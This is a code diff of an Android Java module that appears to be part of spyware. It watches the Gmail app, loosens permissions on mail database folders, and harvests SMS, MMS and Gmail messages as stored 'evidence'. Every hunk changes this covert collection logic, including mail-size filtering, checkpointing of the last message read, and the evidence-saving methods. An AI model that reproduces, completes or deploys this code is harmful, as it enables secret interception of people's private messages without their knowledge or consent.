@@ -65,7 +65,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private static final int ID_MAIL = 0;
 	private static final int ID_SMS = 1;
 	private static final int ID_MMS = 2;
-	private static final int MAIL_PROGRAM = 1;
+	private static final int MAIL_PROGRAM = 2;
 	private boolean mailEnabled;
 	private boolean smsEnabled;
 	private boolean mmsEnabled;
@@ -190,7 +190,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	class ProcessMailObserver implements Observer<ProcessInfo> {
 
-		private String pObserving="com.google.android.gm";
+		private String pObserving = "com.google.android.gm";
 
 		@Override
 		public int notification(ProcessInfo process) {
@@ -269,15 +269,10 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	@Override
 	public void actualGo() {
 		/*
-		if (mailEnabled) {
-			try {
-				readHistoricMail(lastMail);
-			} catch (IOException e) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (initMail) Error: " + e);
-				}
-			}
-		}*/
+		 * if (mailEnabled) { try { readHistoricMail(lastMail); } catch
+		 * (IOException e) { if (Cfg.DEBUG) { Check.log(TAG +
+		 * " (initMail) Error: " + e); } } }
+		 */
 	}
 
 	private void initMail() {
@@ -290,7 +285,6 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				Check.log(TAG + " (initMail) Error: " + e);
 			}
 		}
-
 	}
 
 	private void initSms() {
@@ -363,14 +357,16 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 	}
 
-	private void updateMarkupMail(String mailstore, int lastId) {
+	void updateMarkupMail(String mailstore, int lastId, boolean serialize) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (updateMarkupMail), mailStore: " + mailstore + " +lastId: " + lastId);
 		}
 
 		lastMail.put(mailstore, lastId);
 		try {
-			storedMAIL.writeMarkupSerializable(lastMail);
+			if (serialize || (lastId % 10 == 0)) {
+				storedMAIL.writeMarkupSerializable(lastMail);
+			}
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (updateMarkupMail) Error: " + e);
@@ -379,6 +375,25 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	}
 
 	Semaphore stillReadingEmail = new Semaphore(1);
+
+	private String[] getMailStores(String databasePath) {
+		File file = new File(databasePath);
+		File parent = new File(file.getParent());
+
+		Path.unprotect(parent.getParent());
+		Path.unprotect(parent.getAbsolutePath());
+		Path.unprotect(file.getAbsolutePath());
+
+		FilenameFilter filter = new FilenameFilter() {
+			public boolean accept(File directory, String fileName) {
+				// i_3=mailstore.
+				return fileName.endsWith(".db") && fileName.startsWith(Messages.getString("i_3"));
+			}
+		};
+
+		String[] mailstores = file.list(filter);
+		return mailstores;
+	}
 
 	private int readHistoricMail(Hashtable<String, Integer> lastMail) throws IOException {
 
@@ -400,14 +415,17 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 					GenericSqliteHelper helper = GenericSqliteHelper.open(databasePath, mailstore);
 
 					int lastId = lastMail.containsKey(mailstore) ? lastMail.get(mailstore) : 0;
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (readHistoricMail), mailstore: " + mailstore + " lastId: " + lastId);
+					}
 					visitor.lastId = lastId;
 
 					// i_2=messages
 					// Messages.getString("i_2")
 					int newLastId = helper.traverseRecords("messages", visitor);
 
-					if(newLastId > lastId){
-						updateMarkupMail(mailstore, lastId);
+					if (newLastId > lastId) {
+						updateMarkupMail(mailstore, lastId, true);
 					}
 				}
 			} catch (Exception ex) {
@@ -417,32 +435,13 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			} finally {
 				stillReadingEmail.release();
 			}
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readHistoricMail), still reading...");
 			}
 		}
 
 		return 0;
-	}
-
-	private String[] getMailStores(String databasePath) {
-		File file = new File(databasePath);
-		File parent = new File(file.getParent());
-
-		Path.unprotect(parent.getParent());
-		Path.unprotect(parent.getAbsolutePath());
-		Path.unprotect(file.getAbsolutePath());
-
-		FilenameFilter filter = new FilenameFilter() {
-			public boolean accept(File directory, String fileName) {
-				// i_3=mailstore.
-				return fileName.endsWith(".db") && fileName.startsWith(Messages.getString("i_3"));
-			}
-		};
-
-		String[] mailstores = file.list(filter);
-		return mailstores;
 	}
 
 	private int readHistoricMms(int lastMMS) {
@@ -501,7 +500,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		final long date = sms.getDate();
 		final boolean sent = sms.getSent();
 
-		saveEvidence(address, body, date, sent);
+		saveEvidenceSms(address, body, date, sent);
 	}
 
 	private void saveMms(Mms mms) {
@@ -521,13 +520,23 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		final boolean sent = mms.getSent();
 
-		saveEvidence(address, subject, date, sent);
+		saveEvidenceSms(address, subject, date, sent);
 	}
 
-	public void saveEmail(Email message) {
-		int maxMessageSize = Integer.MAX_VALUE;
-		final String mail = message.makeMimeMessage(maxMessageSize);
+	public boolean saveEmail(Email message) {
 
+		int maxMessageSize = 50 * 1024;
+		final String mail = message.makeMimeMessage(maxMessageSize);
+		
+		if (filterCollect[ID_MAIL].filterMessage(message.getDate(), mail.length(), 0) == Filter.FILTERED_OK) {
+
+			saveEvidenceEmail(message, mail);
+		}
+		return isStopRequested();
+
+	}
+
+	private void saveEvidenceEmail(Email message, String mail) {
 		Check.asserts(mail != null, "Null mail"); //$NON-NLS-1$
 
 		int size = mail.length();
@@ -553,10 +562,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				Check.log(TAG + " (saveEmail) Error: " + e);
 			}
 		} //$NON-NLS-1$
-
 	}
 
-	private void saveEvidence(String address, byte[] body, long date, boolean sent) {
+	private boolean saveEvidenceSms(String address, byte[] body, long date, boolean sent) {
 
 		String from, to;
 
@@ -585,6 +593,8 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
 
 		EvidenceReference.atomic(EvidenceType.SMS_NEW, additionalData, body);
+
+		return isStopRequested();
 	}
 
 	public int notification(Sms s) {
